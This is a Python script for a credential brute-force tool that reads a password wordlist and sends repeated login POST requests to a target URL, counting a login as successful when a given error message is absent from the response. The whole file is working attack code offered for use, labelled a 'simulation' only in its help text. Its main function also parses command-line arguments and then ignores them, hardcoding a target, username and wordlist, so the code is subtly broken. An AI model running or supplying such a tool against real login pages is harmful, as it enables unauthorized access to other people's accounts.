import requests
import argparse
import sys
from typing import List, Optional
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class BruteForceTool:
    def __init__(self, url: str, username: str, password_file: str, error_message: str):
        """Initialize the brute force tool with target parameters."""
        self.url = url
        self.username = username
        self.password_file = password_file
        self.error_message = error_message
        self.session = requests.Session()
        
    def read_passwords(self) -> Optional[List[str]]:
        """Read passwords from the specified file."""
        try:
            with open(self.password_file, 'r', encoding='utf-8') as file:
                passwords = [line.strip() for line in file if line.strip()]
                logger.info(f"Loaded {len(passwords)} passwords from {self.password_file}")
                return passwords
        except FileNotFoundError:
            logger.error(f"Password file {self.password_file} not found")
            return None
        except Exception as e:
            logger.error(f"Error reading password file: {str(e)}")
            return None

    def attempt_login(self, password: str) -> bool:
        """Attempt login with given password."""
        try:
            # Prepare POST data (modify these field names based on target form)
            data = {
                'username': self.username,
                'password': password,
                'submit': 'Login'  # Adjust based on form requirements
            }
            
            # Send POST request
            response = self.session.post(self.url, data=data, timeout=5)
            
            # Check if login was successful (based on error message absence)
            if self.error_message.lower() not in response.text.lower():
                logger.info(f"Success! Valid password found: {password}")
                return True
            else:
                logger.debug(f"Failed attempt with password: {password}")
                return False
                
        except requests.RequestException as e:
            logger.error(f"Request failed for password {password}: {str(e)}")
            return False

    def run(self) -> bool:
        """Execute the brute force attack."""
        passwords = self.read_passwords()
        if not passwords:
            logger.error("No passwords to try. Exiting.")
            return False

        logger.info(f"Starting brute force attack on {self.url} with username: {self.username}")
        
        for password in passwords:
            if self.attempt_login(password):
                print(f"\nSuccess! Valid credentials found:")
                print(f"Username: {self.username}")
                print(f"Password: {password}")
                return True
                
        logger.warning("No valid password found in the provided wordlist")
        return False

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Brute Force Login Simulation Tool")
    parser.add_argument('--url', required=True, help='Target login URL')
    parser.add_argument('--username', required=True, help='Username to test')
    parser.add_argument('--password-file', required=True, help='Path to password wordlist file')
    parser.add_argument('--error-message', default='incorrect', 
                       help='Error message indicating failed login (default: "incorrect")')
    return parser.parse_args()

def main():
    """Main function to run the brute force tool."""
    args = parse_arguments()
    
    try:
        # Initialize and run the tool
        brute_forcer = BruteForceTool(
            url='http://example.com/login',
            username='admin',
            password_file='passwords.txt',
            error_message='login failed'  # Default error message, can be overridden by args.error_message
        )
        
        success = brute_forcer.run()
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        logger.info("Brute force attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()